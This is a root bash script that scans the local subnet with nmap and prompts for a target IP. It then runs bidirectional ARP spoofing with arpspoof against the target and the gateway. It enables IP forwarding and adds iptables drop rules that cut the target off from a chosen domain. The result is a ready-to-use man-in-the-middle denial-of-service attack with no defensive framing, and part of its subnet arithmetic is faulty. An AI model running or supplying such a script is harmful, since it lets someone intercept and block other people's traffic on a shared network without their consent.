#!/bin/bash

# Cheaking for root acces
if [ "$EUID" -ne 0 ]; then
  echo "Please run this script as root or using sudo."
  exit 1
fi

# Get a list of network interfaces
interfaces=$(ip a | grep '^[0-9]' | awk '{print $2}' | sed 's/://')

# Loop through each interface
x=0
list=()
for iface in $interfaces; do
    # Get the IPv4 address and subnet mask
    ipv4_info=$(ip a show dev $iface | grep 'inet ' | awk '{print $2}')
    ip_address=$(echo $ipv4_info | awk -F/ '{print $1}')
    subnet_mask=$(echo $ipv4_info | awk -F/ '{print $2}')

    # Calculate the IP range
    IFS=. read -r i1 i2 i3 i4 <<< "$ip_address"
    IFS=. read -r m1 m2 m3 m4 <<< "$subnet_mask"

    network_ip=$((i1 & m1)).$((i2 & m2)).$((i3 & m3)).$((i4 & m4))
    broadcast_ip=$((i1 | (255 - m1))).$((i2 | (255 - m2))).$((i3 | (255 - m3))).$((i4 | (255 - m4)))
    echo "$x) $iface- $ip_address/$subnet_mask"
    x=$((x + 1))
    list+=("$iface- $ip_address/$subnet_mask")
done


echo "Put interface id"
read i
ip=$(echo "${list[$i]}")
ip=$(echo "$ip" | grep -oP '\d+\.\d+\.\d+\.\d+/\d+')
int=$(echo "${list[$i]}" | cut -d '-' -f 1)
ip=$(echo "$ip" | sed -E 's/\.([0-9]{1,3})\//\.0\//')
echo $ip
echo $int

# Discovering hosts in local network
nmap -sn $ip
gatway=$(ip route | grep 'default')
gatway=$(echo "$gatway" | grep -oP '\d+\.\d+\.\d+\.\d+')
echo "Put Terget IP:"
read terget

# Enabling IP forwording
sysctl -w net.ipv4.ip_forward=1

# Dinial of Survice for given domains
domain="example.com"
DNS=($(dig +short "$domain"))
echo ${DNS[@]}
if [ ${#DNS[@]} -eq 0 ]; then
    echo "url $domain not found"
    exit
fi
for ip in "${DNS[@]}"; do
    iptables -A FORWARD -s "$terget" -d "$ip" -j DROP
    iptables -A FORWARD -s "$ip" -d "$terget" -j DROP
done

# ARP Spoofing using dsniff
mate-terminal -- bash -c "arpspoof -i '$int' -t '$terget' '$gatway'" &
mate-terminal -- bash -c "arpspoof -i '$int' -t '$gatway' '$terget'" &
wait

# Disabling IP forwording
sysctl -w net.ipv4.ip_forward=0

# Allowing all IPs
for ip in "${DNS[@]}"; do
    iptables -D FORWARD -s "$terget" -d "$ip" -j DROP
    iptables -D FORWARD -s "$ip" -d "$terget" -j DROP
done
